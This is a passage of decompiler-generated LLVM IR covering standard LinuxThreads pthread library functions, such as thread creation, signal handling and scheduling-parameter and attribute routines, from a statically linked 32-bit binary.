  store i32 %tmp8, i32* @global_var_8073c84.658, align 4
  %v3_80585d0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_80585d0, i32* @global_var_807e118.698, align 8
  %v0_80585dc = load i32, i32* @global_var_807e110.664, align 16
  store i32 %v0_80585e1, i32* @global_var_8073ab4.661, align 4
  %v1_80585e7 = icmp eq i32 %v0_80585dc, 0
  br i1 %v1_80585e7, label %dec_label_pc_8058615.preheader, label %dec_label_pc_80585eb

dec_label_pc_80585eb:                             ; preds = %dec_label_pc_80585ba
  %v0_80585eb = load i32, i32* @global_var_8073c90.665, align 16
  %tmp18 = icmp slt i32 %v0_80585eb, 1
  br i1 %tmp18, label %dec_label_pc_8058615.preheader, label %dec_label_pc_80585f4

dec_label_pc_80585f4:                             ; preds = %dec_label_pc_80585eb
  store i32 %v0_80585eb, i32* %stack_var_-188, align 4
  %v1_80585f8 = call i32 @__GI_raise(i32 %v0_80585eb)
  %v1_80585fd = call i32 @thread_self.11(i32 %v0_80585eb)
  store i32 %v1_80585fd, i32* %stack_var_-188, align 4
  %v1_8058605 = call i32 @__pthread_wait_for_restart_signal(i32 %v1_80585fd)
  br label %dec_label_pc_8058615.preheader

dec_label_pc_8058615.preheader:                   ; preds = %dec_label_pc_80585eb, %dec_label_pc_80585ba, %dec_label_pc_80585f4
  %v2_8058615 = ptrtoint i32* %stack_var_-160 to i32
  br label %dec_label_pc_8058615

dec_label_pc_8058615:                             ; preds = %dec_label_pc_8058615.preheader, %dec_label_pc_8058631
  %v0_8058620 = load i32, i32* @global_var_8073c84.658, align 4
  store i32 %v0_8058620, i32* %stack_var_-188, align 4
  %v3_8058626 = call i32 @__libc_write(i32 %v0_8058620, i32 %v2_8058615, i32 148)
  %v8_805862e = icmp eq i32 %v3_8058626, -1
  %v1_805862f = icmp eq i1 %v8_805862e, false
  br i1 %v1_805862f, label %dec_label_pc_805863b, label %dec_label_pc_8058631

dec_label_pc_8058631:                             ; preds = %dec_label_pc_8058615
  %v0_8058631 = load i32, i32* %stack_var_-188, align 4
  %v1_8058631 = call i32 @__errno_location(i32 %v0_8058631)
  %v1_8058636 = inttoptr i32 %v1_8058631 to i32*
  %v2_8058636 = load i32, i32* %v1_8058636, align 4
  %v11_8058636 = icmp eq i32 %v2_8058636, 4
  br i1 %v11_8058636, label %dec_label_pc_8058615, label %dec_label_pc_8058631.dec_label_pc_805863b_crit_edge

dec_label_pc_8058631.dec_label_pc_805863b_crit_edge: ; preds = %dec_label_pc_8058631
  br label %dec_label_pc_805863b

dec_label_pc_805863b:                             ; preds = %dec_label_pc_8058615, %dec_label_pc_8058631.dec_label_pc_805863b_crit_edge
  br label %dec_label_pc_805863d

dec_label_pc_805863d:                             ; preds = %dec_label_pc_8058460, %dec_label_pc_80585af, %dec_label_pc_805863b
  %v0_8058644 = phi i32 [ -1, %dec_label_pc_8058460 ], [ -1, %dec_label_pc_80585af ], [ 0, %dec_label_pc_805863b ]
  store i32 %v0_8058440, i32* @ebx, align 4
  ret i32 %v0_8058644

; uselistorder directives
  uselistorder i32 %v0_80585eb, { 0, 3, 2, 1 }
  uselistorder i32 %v0_80585e1, { 1, 0 }
  uselistorder i32 %v4_805850b, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8058498, { 1, 0 }
  uselistorder i32* %stack_var_-188, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 11, 12, 13 }
  uselistorder i32 %tmp8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805863d, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805863b, { 1, 0 }
  uselistorder label %dec_label_pc_8058615, { 1, 0 }
  uselistorder label %dec_label_pc_8058615.preheader, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80585af, { 1, 0 }
  uselistorder label %dec_label_pc_8058582, { 1, 0 }
  uselistorder label %dec_label_pc_805854c, { 1, 0 }
  uselistorder label %dec_label_pc_80584d9, { 1, 0 }
  uselistorder label %dec_label_pc_8058460, { 1, 0 }
}

define i32 @pthread_create(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %v0_8058645 = load i32, i32* @ebx, align 4
  %v0_805864c = load i32, i32* @global_var_8073c84.658, align 4
  %v2_805864c = icmp slt i32 %v0_805864c, 0
  %v1_8058653 = icmp eq i1 %v2_805864c, false
  br i1 %v1_8058653, label %dec_label_pc_8058667, label %dec_label_pc_8058655

dec_label_pc_8058655:                             ; preds = %entry
  %v1_8058655 = call i32 @__pthread_initialize_manager(i32 %v0_8058645)
  %v2_805865f = icmp slt i32 %v1_8058655, 0
  br i1 %v2_805865f, label %dec_label_pc_80586ef, label %dec_label_pc_8058667

dec_label_pc_8058667:                             ; preds = %dec_label_pc_8058655, %entry
  %v1_8058667 = call i32 @thread_self.11(i32 %v0_8058645)
  store i32 %v1_8058667, i32* %stack_var_-152, align 4
  store i32 %v1_8058667, i32* @ebx, align 4
  %v2_805869c = ptrtoint i32* %stack_var_-132 to i32
  store i32 2, i32* %stack_var_-188, align 4
  %v4_80586a5 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* null, i32 %v2_805869c)
  %v2_80586ad = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_80586ad

dec_label_pc_80586ad:                             ; preds = %dec_label_pc_80586c9, %dec_label_pc_8058667
  %v0_80586b8 = load i32, i32* @global_var_8073c84.658, align 4
  store i32 %v0_80586b8, i32* %stack_var_-188, align 4
  %v3_80586be = call i32 @__libc_write(i32 %v0_80586b8, i32 %v2_80586ad, i32 148)
  %v8_80586c6 = icmp eq i32 %v3_80586be, -1
  %v1_80586c7 = icmp eq i1 %v8_80586c6, false
  br i1 %v1_80586c7, label %dec_label_pc_80586d3, label %dec_label_pc_80586c9

dec_label_pc_80586c9:                             ; preds = %dec_label_pc_80586ad
  %v0_80586c9 = load i32, i32* %stack_var_-188, align 4
  %v1_80586c9 = call i32 @__errno_location(i32 %v0_80586c9)
  %v1_80586ce = inttoptr i32 %v1_80586c9 to i32*
  %v2_80586ce = load i32, i32* %v1_80586ce, align 4
  %v11_80586ce = icmp eq i32 %v2_80586ce, 4
  br i1 %v11_80586ce, label %dec_label_pc_80586ad, label %dec_label_pc_80586d3

dec_label_pc_80586d3:                             ; preds = %dec_label_pc_80586c9, %dec_label_pc_80586ad
  %v0_80586d3 = load i32, i32* @ebx, align 4
  store i32 %v0_80586d3, i32* @eax, align 4
  %v0_80586d5 = call i32 @suspend.10()
  %v0_80586da = load i32, i32* @ebx, align 4
  %v1_80586da = add i32 %v0_80586da, 52
  %v2_80586da = inttoptr i32 %v1_80586da to i32*
  %v3_80586da = load i32, i32* %v2_80586da, align 4
  %v4_80586da = icmp eq i32 %v3_80586da, 0
  %v1_80586de = icmp eq i1 %v4_80586da, false
  br i1 %v1_80586de, label %dec_label_pc_80586ec, label %dec_label_pc_80586e0

dec_label_pc_80586e0:                             ; preds = %dec_label_pc_80586d3
  %v1_80586e7 = add i32 %v0_80586da, 48
  %v2_80586e7 = inttoptr i32 %v1_80586e7 to i32*
  %v3_80586e7 = load i32, i32* %v2_80586e7, align 4
  store i32 %v3_80586e7, i32* %arg1, align 4
  %v0_80586ec.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80586ec

dec_label_pc_80586ec:                             ; preds = %dec_label_pc_80586d3, %dec_label_pc_80586e0
  %v0_80586ec = phi i32 [ %v0_80586da, %dec_label_pc_80586d3 ], [ %v0_80586ec.pre, %dec_label_pc_80586e0 ]
  %v1_80586ec = add i32 %v0_80586ec, 52
  %v2_80586ec = inttoptr i32 %v1_80586ec to i32*
  %v3_80586ec = load i32, i32* %v2_80586ec, align 4
  br label %dec_label_pc_80586ef

dec_label_pc_80586ef:                             ; preds = %dec_label_pc_8058655, %dec_label_pc_80586ec
  %v0_80586ef = phi i32 [ 11, %dec_label_pc_8058655 ], [ %v3_80586ec, %dec_label_pc_80586ec ]
  store i32 %v0_8058645, i32* @ebx, align 4
  ret i32 %v0_80586ef

; uselistorder directives
  uselistorder i32 %v0_8058645, { 1, 0, 2 }
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder label %dec_label_pc_80586ef, { 1, 0 }
  uselistorder label %dec_label_pc_80586ec, { 1, 0 }
}

define i32 @__pthread_initialize() local_unnamed_addr {
entry:
  %v1_80586f9 = call i32 @pthread_initialize(i32 ptrtoint (i32* @0 to i32))
  ret i32 %v1_80586f9

; uselistorder directives
  uselistorder i32 (i32)* @pthread_initialize, { 1, 0 }
}

define i32 @pthread_handle_sigcancel(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80586fe = load i32, i32* @ebx, align 4
  store i32 %v0_80586fe, i32* %stack_var_-4, align 4
  %v4_80586fe = ptrtoint i32* %stack_var_-4 to i32
  %v1_8058702 = call i32 @thread_self.11(i32 %v0_80586fe)
  store i32 %v1_8058702, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v6_805870b = icmp eq i32 %v1_8058702, 134691488
  %v1_8058710 = icmp eq i1 %v6_805870b, false
  br i1 %v1_8058710, label %dec_label_pc_805871e, label %dec_label_pc_8058712

dec_label_pc_8058712:                             ; preds = %entry
  %v2_8058716 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8058716, i32* %eax.global-to-local, align 4
  %v2_8058718 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8058718, i32* @ebx, align 4
  %v1_8058719 = call i32 @__pthread_manager_sighandler(i32 %arg1)
  store i32 %v1_8058719, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805871e

dec_label_pc_805871e:                             ; preds = %entry, %dec_label_pc_8058712
  %v0_8058765 = phi i32 [ %v1_8058702, %entry ], [ %v1_8058719, %dec_label_pc_8058712 ]
  %v0_805871e = load i32, i32* @global_var_807a62c.675, align 4
  %v1_805871e = icmp eq i32 %v0_805871e, 0
  br i1 %v1_805871e, label %dec_label_pc_8058753, label %dec_label_pc_8058727

dec_label_pc_8058727:                             ; preds = %dec_label_pc_805871e
  %v1_8058727 = load i32, i32* bitcast (i32** @global_var_8073c80.657 to i32*), align 128
  %v12_8058727 = icmp eq i32 %v0_8058765, %v1_8058727
  %v1_805872d = icmp eq i1 %v12_8058727, false
  br i1 %v1_805872d, label %dec_label_pc_8058727.dec_label_pc_8058745_crit_edge, label %dec_label_pc_805872f

dec_label_pc_8058727.dec_label_pc_8058745_crit_edge: ; preds = %dec_label_pc_8058727
  br label %dec_label_pc_8058745

dec_label_pc_805872f:                             ; preds = %dec_label_pc_8058727
  %v0_8058737 = load i32, i32* @global_var_8073ab4.661, align 4
  %v4_805873d = call i32 @waitpid(i32 %v0_8058737, i32 0, i32 -2147483648, i32 %v0_8058765)
  store i32 %v4_805873d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8058745

dec_label_pc_8058745:                             ; preds = %dec_label_pc_8058727.dec_label_pc_8058745_crit_edge, %dec_label_pc_805872f
  %v0_8058748 = load i32, i32* @global_var_807a630.676, align 16
  %v1_805874e = call i32 @__GI__exit(i32 %v0_8058748)
  unreachable

dec_label_pc_8058753:                             ; preds = %dec_label_pc_805871e
  %v1_8058753 = add i32 %v0_8058765, 66
  %v2_8058753 = inttoptr i32 %v1_8058753 to i8*
  %v3_8058753 = load i8, i8* %v2_8058753, align 1
  %v4_8058753 = icmp eq i8 %v3_8058753, 0
  br i1 %v4_8058753, label %dec_label_pc_805878b, label %dec_label_pc_8058759

dec_label_pc_8058759:                             ; preds = %dec_label_pc_8058753
  %v1_8058759 = add i32 %v0_8058765, 64
  %v2_8058759 = inttoptr i32 %v1_8058759 to i8*
  %v3_8058759 = load i8, i8* %v2_8058759, align 1
  %v4_8058759 = icmp eq i8 %v3_8058759, 0
  %v1_805875d = icmp eq i1 %v4_8058759, false
  br i1 %v1_805875d, label %dec_label_pc_805878b, label %dec_label_pc_805875f

dec_label_pc_805875f:                             ; preds = %dec_label_pc_8058759
  %v1_805875f = add i32 %v0_8058765, 65
  %v2_805875f = inttoptr i32 %v1_805875f to i8*
  %v3_805875f = load i8, i8* %v2_805875f, align 1
  %v12_805875f = icmp eq i8 %v3_805875f, 1
  %v1_8058763 = icmp eq i1 %v12_805875f, false
  br i1 %v1_8058763, label %dec_label_pc_8058773, label %dec_label_pc_8058765

dec_label_pc_8058765:                             ; preds = %dec_label_pc_805875f
  store i32 %v4_80586fe, i32* %eax.global-to-local, align 4
  %v2_805876e = call i32 @__pthread_do_exit(i32 -1, i32 %v4_80586fe)
  store i32 %v2_805876e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8058773

dec_label_pc_8058773:                             ; preds = %dec_label_pc_805875f, %dec_label_pc_8058765
  %v0_805877a = phi i32 [ %v0_8058765, %dec_label_pc_805875f ], [ %v2_805876e, %dec_label_pc_8058765 ]
  %v1_8058773 = add i32 %v0_805877a, 40
  %v2_8058773 = inttoptr i32 %v1_8058773 to i32*
  %v3_8058773 = load i32, i32* %v2_8058773, align 4
  store i32 %v3_8058773, i32* @edx, align 4
  %v1_8058776 = icmp eq i32 %v3_8058773, 0
  br i1 %v1_8058776, label %dec_label_pc_805878b, label %dec_label_pc_805877a

dec_label_pc_805877a:                             ; preds = %dec_label_pc_8058773
  store i32 0, i32* %v2_8058773, align 4
  %v0_8058781 = load i32, i32* %eax.global-to-local, align 4
  %v4_8058786 = inttoptr i32 %v3_8058773 to %sigcontext*
  %v5_8058786 = call i32 @siglongjmp(%sigcontext* %v4_8058786, i32 1, i32 %v0_8058781, i32 %v0_8058781)
  store i32 %v5_8058786, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805878b

dec_label_pc_805878b:                             ; preds = %dec_label_pc_8058773, %dec_label_pc_8058759, %dec_label_pc_8058753, %dec_label_pc_805877a
  %stack_var_-40.0 = phi i32 [ %tmp6, %dec_label_pc_8058753 ], [ %tmp6, %dec_label_pc_8058759 ], [ %tmp6, %dec_label_pc_8058773 ], [ 1, %dec_label_pc_805877a ]
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  ret i32 %stack_var_-40.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v0_8058765, { 1, 2, 3, 5, 4, 0 }
  uselistorder i32 %v1_8058702, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 7, 3, 4, 5, 0, 6, 8 }
  uselistorder label %dec_label_pc_805878b, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8058773, { 1, 0 }
  uselistorder label %dec_label_pc_8058745, { 1, 0 }
  uselistorder label %dec_label_pc_805871e, { 1, 0 }
}

define i32 @pthread_handle_sigrestart(i32 %arg1) local_unnamed_addr {
entry:
  %v1_8058792 = call i32 @thread_self.11(i32 ptrtoint (i32* @0 to i32))
  store i32 %arg1, i32* @edx, align 4
  %v2_805879b = add i32 %v1_8058792, 32
  %v3_805879b = inttoptr i32 %v2_805879b to i32*
  store i32 %arg1, i32* %v3_805879b, align 4
  %v1_805879e = add i32 %v1_8058792, 36
  %v2_805879e = inttoptr i32 %v1_805879e to i32*
  %v3_805879e = load i32, i32* %v2_805879e, align 4
  %v1_80587a1 = icmp eq i32 %v3_805879e, 0
  br i1 %v1_80587a1, label %dec_label_pc_80587af, label %dec_label_pc_80587a5

dec_label_pc_80587a5:                             ; preds = %entry
  %v0_80587a5 = load i32, i32* @ecx, align 4
  %v4_80587aa = inttoptr i32 %v3_805879e to %sigcontext*
  %v5_80587aa = call i32 @siglongjmp(%sigcontext* %v4_80587aa, i32 1, i32 %v0_80587a5, i32 %v0_80587a5)
  br label %dec_label_pc_80587af

dec_label_pc_80587af:                             ; preds = %entry, %dec_label_pc_80587a5
  %v0_80587b2 = phi i32 [ 0, %entry ], [ %v5_80587aa, %dec_label_pc_80587a5 ]
  ret i32 %v0_80587b2

; uselistorder directives
  uselistorder i32 (i32)* @thread_self.11, { 6, 5, 3, 2, 1, 0, 4 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80587af, { 1, 0 }
}

define i32 @__pthread_initialize_minimal() local_unnamed_addr {
entry:
  %v1_80587b8 = call i32 @__libc_pthread_init(i32 0)
  store i32 %v1_80587b8, i32* @global_var_807a634.706, align 4
  ret i32 %v1_80587b8
}

define i32 @pthread_setschedparam(i32 %arg1, i32 %arg2, i32* %arg3) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg3 to i32
  %v0_80587c9 = load i32, i32* @ebx, align 4
  store i32 0, i32* @edx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_80587d9 = urem i32 %arg1, 1024
  %v2_80587de = mul nuw nsw i32 %v1_80587d9, 16
  %v1_80587e1 = add i32 %v2_80587de, ptrtoint (i32* @global_var_806f8a0.659 to i32)
  store i32 %v1_80587e1, i32* @esi, align 4
  store i32 %v1_80587e1, i32* @eax, align 4
  %v1_80587e9 = call i32 @__pthread_lock(i32 %v0_80587c9)
  %v0_80587ee = load i32, i32* @esi, align 4
  %v1_80587ee = add i32 %v0_80587ee, 8
  %v2_80587ee = inttoptr i32 %v1_80587ee to i32*
  %v3_80587ee = load i32, i32* %v2_80587ee, align 4
  store i32 %v3_80587ee, i32* @ebx, align 4
  %v1_80587f1 = icmp eq i32 %v3_80587ee, 0
  br i1 %v1_80587f1, label %dec_label_pc_80587fa, label %dec_label_pc_80587f5

dec_label_pc_80587f5:                             ; preds = %entry
  %v1_80587f5 = add i32 %v3_80587ee, 16
  %v2_80587f5 = inttoptr i32 %v1_80587f5 to i32*
  %v3_80587f5 = load i32, i32* %v2_80587f5, align 4
  %v4_80587f5 = load i32, i32* @edi, align 4
  %v15_80587f5 = icmp eq i32 %v3_80587f5, %v4_80587f5
  br i1 %v15_80587f5, label %dec_label_pc_805880a, label %dec_label_pc_80587fa

dec_label_pc_80587fa:                             ; preds = %dec_label_pc_80587f5, %entry
  %v1_80587fe = inttoptr i32 %v0_80587ee to i32*
  %v2_80587fe = call i32 @__pthread_unlock(i32* %v1_80587fe)
  br label %dec_label_pc_8058863

dec_label_pc_805880a:                             ; preds = %dec_label_pc_80587f5
  %v1_8058810 = add i32 %v3_80587ee, 20
  %v2_8058810 = inttoptr i32 %v1_8058810 to i32*
  %v3_8058810 = load i32, i32* %v2_8058810, align 4
  %v3_8058813 = call i32 @sched_setscheduler(i32 %v3_8058810, i32 %tmp5, i32 %v4_80587f5)
  %v8_805881b = icmp eq i32 %v3_8058813, -1
  %v1_805881c = icmp eq i1 %v8_805881b, false
  br i1 %v1_805881c, label %dec_label_pc_8058830, label %dec_label_pc_805881e

dec_label_pc_805881e:                             ; preds = %dec_label_pc_805880a
  %v0_8058821 = load i32, i32* @esi, align 4
  %v1_8058822 = inttoptr i32 %v0_8058821 to i32*
  %v2_8058822 = call i32 @__pthread_unlock(i32* %v1_8058822)
  %v1_8058827 = call i32 @__errno_location(i32 %v0_8058821)
  %v1_805882c = inttoptr i32 %v1_8058827 to i32*
  %v2_805882c = load i32, i32* %v1_805882c, align 4
  br label %dec_label_pc_8058863

dec_label_pc_8058830:                             ; preds = %dec_label_pc_805880a
  %v1_8058832 = icmp eq i32 %arg2, 0
  br i1 %v1_8058832, label %dec_label_pc_805883c, label %dec_label_pc_8058836

dec_label_pc_8058836:                             ; preds = %dec_label_pc_8058830
  %v2_805883a = load i32, i32* %arg3, align 4
  br label %dec_label_pc_805883c

dec_label_pc_805883c:                             ; preds = %dec_label_pc_8058830, %dec_label_pc_8058836
  %v0_805883f = phi i32 [ 0, %dec_label_pc_8058830 ], [ %v2_805883a, %dec_label_pc_8058836 ]
  %v2_805883f = add i32 %v3_80587ee, 24
  %v3_805883f = inttoptr i32 %v2_805883f to i32*
  store i32 %v0_805883f, i32* %v3_805883f, align 4
  %v0_8058842 = load i32, i32* @esi, align 4
  %v1_8058843 = inttoptr i32 %v0_8058842 to i32*
  %v2_8058843 = call i32 @__pthread_unlock(i32* %v1_8058843)
  %v0_805884d = load i32, i32* @global_var_8073c84.658, align 4
  %v2_805884d = icmp slt i32 %v0_805884d, 0
  br i1 %v2_805884d, label %dec_label_pc_8058866, label %dec_label_pc_8058856

dec_label_pc_8058856:                             ; preds = %dec_label_pc_805883c
  %v3_8058859 = load i32, i32* %v3_805883f, align 4
  %v1_805885c = call i32 @__pthread_manager_adjust_prio(i32 %v3_8058859)
  br label %dec_label_pc_8058863

dec_label_pc_8058863:                             ; preds = %dec_label_pc_805881e, %dec_label_pc_80587fa, %dec_label_pc_8058856
  %v0_805886d4 = phi i32 [ %v2_805882c, %dec_label_pc_805881e ], [ 3, %dec_label_pc_80587fa ], [ 0, %dec_label_pc_8058856 ]
  br label %dec_label_pc_8058866

dec_label_pc_8058866:                             ; preds = %dec_label_pc_805883c, %dec_label_pc_8058863
  %v0_805886d = phi i32 [ 0, %dec_label_pc_805883c ], [ %v0_805886d4, %dec_label_pc_8058863 ]
  ret i32 %v0_805886d

; uselistorder directives
  uselistorder i32 %v4_80587f5, { 1, 0 }
  uselistorder i32 %v3_80587ee, { 1, 0, 2, 3, 4 }
  uselistorder i32 (i32)* @__pthread_manager_adjust_prio, { 1, 2, 0 }
  uselistorder i32* @global_var_8073c84.658, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 20, 1, 21 }
  uselistorder label %dec_label_pc_8058866, { 1, 0 }
  uselistorder label %dec_label_pc_8058863, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805883c, { 1, 0 }
}

define i32 @__GI_pthread_getschedparam(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_805886f = load i32, i32* @ebx, align 4
  store i32 0, i32* @edx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_805887b = urem i32 %arg1, 1024
  %v2_8058880 = mul nuw nsw i32 %v1_805887b, 16
  %v1_8058883 = add i32 %v2_8058880, ptrtoint (i32* @global_var_806f8a0.659 to i32)
  store i32 %v1_8058883, i32* @ebx, align 4
  store i32 %v1_8058883, i32* @eax, align 4
  %v1_805888b = call i32 @__pthread_lock(i32 %v0_805886f)
  %v0_8058890 = load i32, i32* @ebx, align 4
  %v1_8058890 = add i32 %v0_8058890, 8
  %v2_8058890 = inttoptr i32 %v1_8058890 to i32*
  %v3_8058890 = load i32, i32* %v2_8058890, align 4
  %v1_8058893 = icmp eq i32 %v3_8058890, 0
  br i1 %v1_8058893, label %dec_label_pc_805889c, label %dec_label_pc_8058897

dec_label_pc_8058897:                             ; preds = %entry
  %v1_8058897 = add i32 %v3_8058890, 16
  %v2_8058897 = inttoptr i32 %v1_8058897 to i32*
  %v3_8058897 = load i32, i32* %v2_8058897, align 4
  %v4_8058897 = load i32, i32* @esi, align 4
  %v15_8058897 = icmp eq i32 %v3_8058897, %v4_8058897
  br i1 %v15_8058897, label %dec_label_pc_80588af, label %dec_label_pc_805889c

dec_label_pc_805889c:                             ; preds = %dec_label_pc_8058897, %entry
  store i32 %v0_8058890, i32* %stack_var_-28, align 4
  %v1_80588a0 = inttoptr i32 %v0_8058890 to i32*
  %v2_80588a0 = call i32 @__pthread_unlock(i32* %v1_80588a0)
  br label %dec_label_pc_80588f0

dec_label_pc_80588af:                             ; preds = %dec_label_pc_8058897
  %v1_80588b2 = add i32 %v3_8058890, 20
  %v2_80588b2 = inttoptr i32 %v1_80588b2 to i32*
  %v3_80588b2 = load i32, i32* %v2_80588b2, align 4
  store i32 %v3_80588b2, i32* @esi, align 4
  store i32 %v0_8058890, i32* %stack_var_-28, align 4
  %v1_80588b6 = inttoptr i32 %v0_8058890 to i32*
  %v2_80588b6 = call i32 @__pthread_unlock(i32* %v1_80588b6)
  %v0_80588bb = load i32, i32* @esi, align 4
  store i32 %v0_80588bb, i32* %stack_var_-28, align 4
  %v1_80588be = call i32 @sched_getscheduler(i32 %v0_80588bb)
  store i32 %v1_80588be, i32* @ebx, align 4
  %v10_80588c8 = icmp eq i32 %v1_80588be, -1
  br i1 %v10_80588c8, label %dec_label_pc_80588df, label %dec_label_pc_80588cd

dec_label_pc_80588cd:                             ; preds = %dec_label_pc_80588af
  %v0_80588cd = load i32, i32* @ecx, align 4
  %v0_80588d3 = load i32, i32* @esi, align 4
  store i32 %v0_80588d3, i32* %stack_var_-28, align 4
  %v4_80588d4 = call i32 @sched_getparam(i32 %v0_80588d3, i32 %arg3, i32 %v0_80588cd, i32 %v0_80588cd)
  %v8_80588dc = icmp eq i32 %v4_80588d4, -1
  %v1_80588dd = icmp eq i1 %v8_80588dc, false
  br i1 %v1_80588dd, label %dec_label_pc_80588e8, label %dec_label_pc_80588df

dec_label_pc_80588df:                             ; preds = %dec_label_pc_80588cd, %dec_label_pc_80588af
  %v0_80588df = load i32, i32* %stack_var_-28, align 4
  %v1_80588df = call i32 @__errno_location(i32 %v0_80588df)
  %v1_80588e4 = inttoptr i32 %v1_80588df to i32*
  %v2_80588e4 = load i32, i32* %v1_80588e4, align 4
  br label %dec_label_pc_80588f0

dec_label_pc_80588e8:                             ; preds = %dec_label_pc_80588cd
  %v0_80588ec = load i32, i32* @ebx, align 4
  store i32 %v0_80588ec, i32* %arg2, align 4
  br label %dec_label_pc_80588f0

dec_label_pc_80588f0:                             ; preds = %dec_label_pc_80588df, %dec_label_pc_805889c, %dec_label_pc_80588e8
  %v0_80588f3 = phi i32 [ %v2_80588e4, %dec_label_pc_80588df ], [ 3, %dec_label_pc_805889c ], [ 0, %dec_label_pc_80588e8 ]
  ret i32 %v0_80588f3

; uselistorder directives
  uselistorder i32 %v0_8058890, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_80588f0, { 2, 0, 1 }
}

define i32 @pthread_attr_destroy() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__GI_pthread_attr_setdetachstate(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = or i32 %arg2, 1
  %tmp4 = icmp eq i32 %tmp3, 1
  br i1 %tmp4, label %dec_label_pc_8058905, label %dec_label_pc_805890d

dec_label_pc_8058905:                             ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_805890d

dec_label_pc_805890d:                             ; preds = %entry, %dec_label_pc_8058905
  %v0_805890d = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_8058905 ]
  ret i32 %v0_805890d

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805890d, { 1, 0 }
}

define i32 @__GI_pthread_attr_getdetachstate(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_8058912 = load i32, i32* %arg1, align 4
  %v2_8058918 = inttoptr i32 %arg2 to i32*
  store i32 %v2_8058912, i32* %v2_8058918, align 4
  ret i32 0
}

define i32 @__GI_pthread_attr_setschedpolicy(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v6_8058929 = icmp ugt i32 %arg2, 2
  br i1 %v6_8058929, label %dec_label_pc_8058934, label %dec_label_pc_805892b

dec_label_pc_805892b:                             ; preds = %entry
  %v2_805892f = add i32 %arg1, 4
  %v3_805892f = inttoptr i32 %v2_805892f to i32*
  store i32 %arg2, i32* %v3_805892f, align 4
  br label %dec_label_pc_8058934

dec_label_pc_8058934:                             ; preds = %entry, %dec_label_pc_805892b
  %v0_8058934 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_805892b ]
  ret i32 %v0_8058934

; uselistorder directives
  uselistorder label %dec_label_pc_8058934, { 1, 0 }
}

define i32 @pthread_attr_getschedpolicy(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_8058939 = add i32 %arg1, 4
  %v2_8058939 = inttoptr i32 %v1_8058939 to i32*
  %v3_8058939 = load i32, i32* %v2_8058939, align 4
  store i32 %v3_8058939, i32* %arg2, align 4
  ret i32 0
}

define i32 @pthread_attr_setinheritsched(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = or i32 %arg2, 1
  %tmp4 = icmp eq i32 %tmp3, 1
  br i1 %tmp4, label %dec_label_pc_8058953, label %dec_label_pc_805895c

dec_label_pc_8058953:                             ; preds = %entry
  %v2_8058957 = add i32 %arg1, 12
  %v3_8058957 = inttoptr i32 %v2_8058957 to i32*
  store i32 %arg2, i32* %v3_8058957, align 4
  br label %dec_label_pc_805895c

dec_label_pc_805895c:                             ; preds = %entry, %dec_label_pc_8058953
  %v0_805895c = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_8058953 ]
  ret i32 %v0_805895c

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_805895c, { 1, 0 }
}

define i32 @pthread_attr_getinheritsched(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_8058961 = add i32 %arg1, 12
  %v2_8058961 = inttoptr i32 %v1_8058961 to i32*
  %v3_8058961 = load i32, i32* %v2_8058961, align 4
  store i32 %v3_8058961, i32* %arg2, align 4
  ret i32 0
}

define i32 @pthread_attr_setscope(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8058971 = icmp eq i32 %arg2, 0
  br i1 %v1_8058971, label %dec_label_pc_8058984, label %dec_label_pc_8058975

dec_label_pc_8058975:                             ; preds = %entry
  %v8_8058975 = icmp eq i32 %arg2, 1
